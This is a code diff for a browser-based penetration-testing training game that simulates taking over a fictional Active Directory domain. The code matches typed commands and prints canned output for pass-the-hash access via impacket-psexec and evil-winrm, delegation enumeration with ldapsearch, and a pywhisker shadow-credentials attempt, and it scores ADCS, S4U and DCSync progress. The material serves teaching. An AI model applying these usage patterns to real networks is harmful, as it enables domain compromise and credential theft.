+  // IMPACKET-PSEXEC / EVIL-WINRM - SHELL ACCESS
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'impacket-psexec' || cmd === 'psexec') {
+    if (!state.extractedNTHash && !state.gotServiceTicket) {
+      print('[!] Need DA credentials first', 'error');
+      return;
+    }
+
+    if ((fullCmd.includes('10.10.50.10') || fullCmd.includes('dc01')) &&
+        (fullCmd.includes('Administrator') || fullCmd.includes('-k'))) {
+      await simulateLoading('Connecting via PsExec', 2000);
+      print('');
+      print('Impacket v0.10.0 - PsExec', 'system');
+      print('[*] Requesting shares on 10.10.50.10...', 'system');
+      print('[*] Found writable share ADMIN$', 'system');
+      print('[*] Uploading file...', 'system');
+      print('[*] Opening SVCManager on 10.10.50.10...', 'system');
+      print('[*] Creating service on 10.10.50.10...', 'system');
+      print('[*] Starting service on 10.10.50.10...', 'system');
+      print('[!] Press help for extra shell commands', 'system');
+      print('');
+      print('Microsoft Windows [Version 10.0.20348.1]', 'system');
+      print('(c) Microsoft Corporation. All rights reserved.', 'system');
+      print('');
+      print('C:\\Windows\\system32>', 'success');
+
+      state.currentHost = 'DC01';
+      state.currentUser = 'Administrator';
+      setPrompt('Administrator', 'DC01', 'C:\\Windows\\system32');
+      playSuccess();
+      autosave();
+      return;
+    }
+
+    print('Usage: impacket-psexec <domain>/<user>@<target> -hashes :<nthash>', 'error');
+    return;
+  }
+
+  if (cmd === 'evil-winrm') {
+    if (!state.extractedNTHash && !state.gotServiceTicket) {
+      print('[!] Need DA credentials first', 'error');
+      return;
+    }
+
+    const hasHash = fullCmd.includes('-H') && fullCmd.includes('2b576acbe6bcfda7294d6bd18041b8fe');
+    const hasTarget = fullCmd.includes('10.10.50.10');
+
+    if (hasTarget && hasHash) {
+      await simulateLoading('Connecting via WinRM', 2000);
+      print('');
+      print('Evil-WinRM shell v3.5', 'success');
+      print('[*] Connecting to 10.10.50.10 with hash...', 'system');
+      print('');
+      print('*Evil-WinRM* PS C:\\Users\\Administrator\\Documents>', 'success');
+
+      state.currentHost = 'DC01';
+      state.currentUser = 'Administrator';
+      setPrompt('Administrator', 'DC01', 'C:\\Users\\Administrator');
+      playSuccess();
+      autosave();
+      return;
+    }
+
+    print('Usage: evil-winrm -i <ip> -u <user> -H <nthash>', 'error');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // SHELL COMMANDS ON DC
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'whoami') {
+    if (state.currentHost === 'DC01') {
+      print('blackpeak\\administrator', 'success');
+      if (!state.gotDomainAdmin) {
+        state.gotDomainAdmin = true;
+        print('');
+        completeLevel();
+      }
+      return;
+    }
+    print('blackpeak\\web_svc', 'system');
+    return;
+  }
+
+  if (cmd === 'hostname') {
+    print(state.currentHost, 'system');
+    return;
+  }
+
+  if (cmd === 'net' && args[0] === 'user' && args[1] === '/domain') {
+    print('User accounts for \\\\DC01.BLACKPEAK.LOCAL', 'system');
+    print('', 'system');
+    print('----------------------------------------------------', 'system');
+    print('Administrator         backup_admin          Guest', 'system');
+    print('krbtgt               sql_svc               web_svc', 'system');
+    print('', 'system');
+    print('The command completed successfully.', 'system');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // LDAPSEARCH
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'ldapsearch') {
+    if (fullCmd.includes('delegation')) {
+      print('# searching for constrained delegation', 'system');
+      print('dn: CN=web_svc,CN=Users,DC=blackpeak,DC=local', 'system');
+      print('sAMAccountName: web_svc', 'system');
+      print('msDS-AllowedToDelegateTo: cifs/dc01.blackpeak.local', 'success');
+      print('userAccountControl: 16781312 (TRUSTED_TO_AUTH_FOR_DELEGATION)', 'warning');
+      print('', 'system');
+      state.foundConstrainedDeleg = true;
+      return;
+    }
+
+    print('# LDAP search results', 'system');
+    print('dn: DC=blackpeak,DC=local', 'system');
+    print('objectClass: domain', 'system');
+    return;
+  }
+
+  // ═══════════════════════════════════════════════════════════════
+  // PYWHISKER - SHADOW CREDENTIALS (Easter egg path)
+  // ═══════════════════════════════════════════════════════════════
+  if (cmd === 'pywhisker') {
+    if (!state.enumDomain) {
+      print('[!] Enumerate domain first', 'warning');
+      return;
+    }
+
+    if (fullCmd.includes('--action') && fullCmd.includes('add')) {
+      await simulateLoading('Adding shadow credential', 2000);
+      print('');
+      print('[*] pywhisker v0.1 - Shadow Credentials Attack', 'system');
+      print('[*] Target: Administrator', 'warning');
+      print('[*] Adding msDS-KeyCredentialLink attribute...', 'system');
+      print('');
+      print('[!] ERROR: Insufficient permissions', 'error');
+      print('[!] Need GenericWrite/GenericAll on target object', 'error');
+      print('');
+      print('[*] HINT: web_svc doesn\'t have write access to Administrator', 'info');
+      print('[*] Try the ADCS or S4U attack paths instead', 'info');
+
+      addEasterEgg('lvl3_whisker', 'Shadow creds require write access - not all paths work!');
+      return;
+    }
+
+    print('Usage: pywhisker -d <domain> -u <user> -p <pass> --target <user> --action add', 'error');
+    return;
+  }
+
+  print(`Command not found: ${cmd}`, 'error');
+}
+
+function calculateLevel3Progress(state) {
+  let progress = 0;
+
+  // Recon (20%)
+  if (state.enumDomain) progress += 5;
+  if (state.foundCA) progress += 5;
+  if (state.enumTemplates) progress += 5;
+  if (state.foundConstrainedDeleg) progress += 5;
+
+  // ADCS Path (30%)
+  if (state.foundVulnTemplate) progress += 10;
+  if (state.gotAdminCert) progress += 10;
+  if (state.extractedNTHash) progress += 10;
+
+  // S4U Path (20%)
+  if (state.requestedTGT) progress += 5;
+  if (state.performedS4U) progress += 10;
+  if (state.gotServiceTicket) progress += 5;
+
+  // Final (30%)
+  if (state.dcsyncPerformed) progress += 15;
+  if (state.gotDomainAdmin) progress += 15;
+
+  // Cap at 100
+  return Math.min(progress, 100);
+}
+</script>
